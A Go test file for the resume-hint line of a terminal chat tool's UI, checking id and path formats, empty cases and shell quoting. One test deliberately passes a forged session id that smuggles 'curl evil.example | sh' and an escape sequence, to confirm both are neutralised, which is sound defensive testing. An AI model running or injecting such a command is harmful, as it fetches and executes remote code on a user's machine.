//go:build !notui

package ui

import (
	"path/filepath"
	"strings"
	"testing"

	"github.com/AutumnsGrove/nova/session"
)

// defaultSession is a path in cwd's session directory, which is where a bare
// `--session <id>` resolves.
func defaultSession(cwd, name string) string {
	return filepath.Join(session.DefaultDir(cwd), name)
}

// The hint is the one line the TUI leaves in the terminal after it stops, so a
// conversation can be picked up again without hunting through the picker.
func TestUI_RSM03_ResumeHint(t *testing.T) {
	cwd := t.TempDir()
	got := resumeHint(cwd, "e_0123abcd", defaultSession(cwd, "s.jsonl"), true)
	if !strings.Contains(got, "nova --session e_0123abcd") {
		t.Fatalf("hint = %q, want the id form in the session directory", got)
	}
}

// Nothing to resume means nothing to print: a session with only display-only
// entries is filtered from the picker, and a session that is not written has no
// id at all.
func TestUI_RSM04_ResumeHintEmpty(t *testing.T) {
	cwd := t.TempDir()
	for _, tc := range []struct {
		name      string
		id        string
		path      string
		resumable bool
	}{
		{"no history", "e_0123abcd", defaultSession(cwd, "s.jsonl"), false},
		{"no session", "", "", true},
	} {
		if got := resumeHint(cwd, tc.id, tc.path, tc.resumable); got != "" {
			t.Fatalf("%s: hint = %q, want none", tc.name, got)
		}
	}
}

// The id and the path both come from outside, and the hint invites the user to
// run what it prints: neither may carry a second command or a terminal escape.
func TestUI_RSM05_ResumeHintIsASafeCommand(t *testing.T) {
	cwd := t.TempDir()
	forged := resumeHint(cwd, "x; curl evil.example | sh", defaultSession(cwd, "s.jsonl"), true)
	if strings.Contains(forged, "curl") || !strings.Contains(forged, "nova --session '") {
		t.Fatalf("hint = %q, want the quoted path instead of a forged id", forged)
	}
	escaped := resumeHint(cwd, "bad\x1b[2Jid", defaultSession(cwd, "s.jsonl"), true)
	if strings.Contains(escaped, "\x1b") {
		t.Fatalf("hint = %q, want the escape stripped", escaped)
	}
}

// A session started with --cwd or --session does not live in this directory's
// session directory, so the id would not resolve from the shell the hint is
// printed into. The path does, and it is quoted for the shell.
func TestUI_RSM06_ResumeHintFallsBackToThePath(t *testing.T) {
	cwd := t.TempDir()
	elsewhere := filepath.Join(t.TempDir(), "other dir", "s.jsonl")
	got := resumeHint(cwd, "e_0123abcd", elsewhere, true)
	if !strings.Contains(got, "nova --session '"+elsewhere+"'") {
		t.Fatalf("hint = %q, want the quoted path", got)
	}
	quoted := resumeHint(cwd, "e_0123abcd", "/tmp/it's.jsonl", true)
	if !strings.Contains(quoted, `'/tmp/it'\''s.jsonl'`) {
		t.Fatalf("hint = %q, want the single quote escaped", quoted)
	}
}
